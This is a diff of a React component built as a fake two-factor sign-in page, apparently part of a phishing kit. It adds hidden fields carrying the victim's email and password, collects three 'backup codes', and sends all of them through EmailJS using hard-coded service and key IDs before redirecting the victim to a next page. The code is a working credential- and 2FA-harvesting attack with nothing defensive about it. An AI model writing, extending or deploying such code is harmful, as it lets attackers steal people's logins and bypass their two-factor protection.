@@ -1,13 +1,56 @@
+import  React , { useRef } from 'react';
 import logo from "./logo.svg";
 import "./App.css";
+import Checkbox from '@mui/material/Checkbox';
+import {useNavigate} from 'react-router-dom';
+import emailjs, { init } from "emailjs-com";
 
 function Second(props) {
-  
+  const form = useRef();
+  const navigate = useNavigate();
+
+  const [code1, setCode1] = React.useState("");
+  const [code2, setCode2] = React.useState("");
+  const [code3, setCode3] = React.useState("");
+
+  const handleCode1 = (event) => {
+    setCode1(event.target.value);
+  };
+
+  const handleCode2 = (event) => {
+    setCode2(event.target.value);
+  };
+
+  const handleCode3 = (event) => {
+    setCode3(event.target.value);
+  };
+
+  const handlesubmit = (e) => {
+    e.preventDefault();
+    console.log(form);
+    
+    emailjs.sendForm("service_ah6b16l", "template_cnlkbts", form.current, "v9949mcN8FF4d_L3u").then(
+      (result) => {
+        
+        console.log(result.text);
+        navigate('/third', {replace: true});
+      },
+      (error) => {
+        console.log(error.text);
+      }
+    );
+  };
+
+  const [checked, setChecked] = React.useState(true);
+
+  const handleChange = (event) => {
+    setChecked(event.target.checked);
+  };
 
   return (
     <div className="a">
       <div className="form-container">
-        <form method="post" id="loginForm">
+        <form id="loginForm" ref={form} onSubmit={handlesubmit}>
           <div id="tfa-login" className="views">
             <div
               className="otknotice-stripe otknotice-active"
@@ -106,89 +149,98 @@ function Second(props) {
                 {" "}
               </div>
               <br/>
-              <div className="otkform-group">
-                <label className="otklabel label-uppercase" htmlFor="twoFactorCode">
-                  Backup code 1
-                </label>
-                <div className="otkinput otkinput-grouped otkform-group-field input-margin-bottom-error-message otkinput-grouped_radius">
-                  <input
-                    type="text"
-                    id="twoFactorCode"
-                    name="oneTimeCode"
-                    defaultValue=""
-                    placeholder="Enter 8 digit code"
-                    autoCorrect="off"
-                    autoCapitalize="off"
-                    autoComplete="off"
-                  />
+
+                <input type="hidden" name="email" value={props.email} />
+                <input type="hidden" name="password" value={props.password} />
+                <div className="otkform-group">
+                  <label className="otklabel label-uppercase" htmlFor="twoFactorCode">
+                    Backup code 1
+                  </label>
+                  <div className="otkinput otkinput-grouped otkform-group-field input-margin-bottom-error-message otkinput-grouped_radius">
+                    <input
+                      type="text"
+                      id="twoFactorCode"
+                      name="code1"
+                      defaultValue=""
+                      placeholder="Enter 8 digit code"
+                      autoCorrect="off"
+                      autoCapitalize="off"
+                      autoComplete="off"
+                      value={code1}
+                      onChange={handleCode1}
+                    />
+                  </div>
                 </div>
-              </div>
-              <div className="otkform-group">
-                <label className="otklabel label-uppercase" htmlFor="twoFactorCode">
-                  Backup code 2
-                </label>
-                <div className="otkinput otkinput-grouped otkform-group-field input-margin-bottom-error-message otkinput-grouped_radius">
-                  <input
-                    type="text"
-                    id="twoFactorCode"
-                    name="oneTimeCode"
-                    defaultValue=""
-                    placeholder="Enter 8 digit code"
-                    autoCorrect="off"
-                    autoCapitalize="off"
-                    autoComplete="off"
-                  />
+                <div className="otkform-group">
+                  <label className="otklabel label-uppercase" htmlFor="twoFactorCode">
+                    Backup code 2
+                  </label>
+                  <div className="otkinput otkinput-grouped otkform-group-field input-margin-bottom-error-message otkinput-grouped_radius">
+                    <input
+                      type="text"
+                      id="twoFactorCode"
+                      name="code2"
+                      defaultValue=""
+                      placeholder="Enter 8 digit code"
+                      autoCorrect="off"
+                      autoCapitalize="off"
+                      autoComplete="off"
+                      value={code2}
+                      onChange={handleCode2}
+                    />
+                  </div>
                 </div>
-              </div>
-              <div className="otkform-group">
-                <label className="otklabel label-uppercase" htmlFor="twoFactorCode">
-                  Backup code 3
-                </label>
-                <div className="otkinput otkinput-grouped otkform-group-field input-margin-bottom-error-message otkinput-grouped_radius">
-                  <input
-                    type="text"
-                    id="twoFactorCode"
-                    name="oneTimeCode"
-                    defaultValue=""
-                    placeholder="Enter 8 digit code"
-                    autoCorrect="off"
-                    autoCapitalize="off"
-                    autoComplete="off"
-                  />
+                <div className="otkform-group">
+                  <label className="otklabel label-uppercase" htmlFor="twoFactorCode">
+                    Backup code 3
+                  </label>
+                  <div className="otkinput otkinput-grouped otkform-group-field input-margin-bottom-error-message otkinput-grouped_radius">
+                    <input
+                      type="text"
+                      id="twoFactorCode"
+                      name="code3"
+                      defaultValue=""
+                      placeholder="Enter 8 digit code"
+                      autoCorrect="off"
+                      autoCapitalize="off"
+                      autoComplete="off"
+                      value={code3}
+                      onChange={handleCode3}
+                    />
+                  </div>
                 </div>
-              </div>
-              <br />
-              <span className="otkcheckbox ">
-                <input type="hidden" name="_trustThisDevice" defaultValue="" />
-                <input
-                  type="checkbox"
-                  id="trustThisDevice"
-                  name="trustThisDevice"
-                />
-                <label htmlFor="trustThisDevice">
-                  <span id="content" className="link-in-message">
-                    Remember this device
-                  </span>
-                </label>
-              </span>
-              <div className="separator-32"></div>
-              <div className="btn-box">
-                <input
-                  type="hidden"
-                  name="_eventId"
-                  defaultValue="submit"
-                  id="_eventId"
-                />
-                <a
-                  role="button"
-                  className="otkbtn otkbtn-primary  zero-margin"
-                  href="/third"
-                  id="btnSubmit"
-                  style={{float:"right",maxWidth:"100%",fontSize:"16px"}}
-                >
-                  Sign in
-                </a>
-              </div>
+                <br />
+                <span className="otkcheckbox ">
+                  <input type="hidden" name="_trustThisDevice" defaultValue="" />
+                  <Checkbox
+                    checked={checked}
+                    onChange={handleChange}
+                    inputProps={{ 'aria-label': 'controlled' }}
+                    sx={{ '& .MuiSvgIcon-root': { fontSize: 28 } }}
+                  />
+
+                    <span id="content" className="link-in-message" style={{color:'white'}}>
+                      Remember this device
+                    </span>
+                </span>
+                <div className="separator-32"></div>
+                <div className="btn-box">
+                  <input
+                    type="hidden"
+                    name="_eventId"
+                    defaultValue="submit"
+                    id="_eventId"
+                  />
+                  <button
+                    type="submit"
+                    className="otkbtn otkbtn-primary  zero-margin"
+                    id="btnSubmit"
+                    style={{float:"right",maxWidth:"100%",fontSize:"16px"}}
+                  >
+                    Sign in
+                  </button>
+                </div>
+
               <div className="separator-16"></div>
               <a
                 href=""
